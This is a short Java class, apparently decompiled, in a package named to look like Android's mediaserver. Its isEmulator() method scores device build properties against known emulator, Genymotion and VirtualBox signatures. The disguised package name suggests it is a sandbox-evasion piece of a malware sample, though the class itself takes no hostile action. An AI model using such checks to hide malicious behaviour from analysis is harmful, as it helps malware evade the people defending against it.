package com.android.mediaserver.anti;

import android.os.Build;
import android.support.v4.os.EnvironmentCompat;

public class AntiEmulator {
  public static boolean isEmulator() {
    int rating = 0;
    if (Build.PRODUCT.equals("sdk") || Build.PRODUCT.equals("google_sdk") || Build.PRODUCT.equals(
        "sdk_x86") || Build.PRODUCT.equals("vbox86p")) {
      rating = 0 + 1;
    }

    if (Build.MANUFACTURER.equals(EnvironmentCompat.MEDIA_UNKNOWN) || Build.MANUFACTURER.equals(
        "Genymotion")) {
      rating++;
    }

    if (Build.BRAND.equals("generic") || Build.BRAND.equals("generic_x86")) {
      rating++;
    }

    if (Build.DEVICE.equals("generic") || Build.DEVICE.equals("generic_x86") || Build.DEVICE.equals(
        "vbox86p")) {
      rating++;
    }

    if (Build.MODEL.equals("sdk") || Build.MODEL.equals("google_sdk") || Build.MODEL.equals(
        "Android SDK built for x86")) {
      rating++;
    }

    if (Build.HARDWARE.equals("goldfish") || Build.HARDWARE.equals("vbox86")) {
      rating++;
    }

    if (Build.FINGERPRINT.contains("generic/sdk/generic") || Build.FINGERPRINT.contains(
        "generic_x86/sdk_x86/generic_x86") || Build.FINGERPRINT.contains(
        "generic/google_sdk/generic") || Build.FINGERPRINT.contains("generic/vbox86p/vbox86p")) {
      rating++;
    }
    return rating >= 2;
  }
}
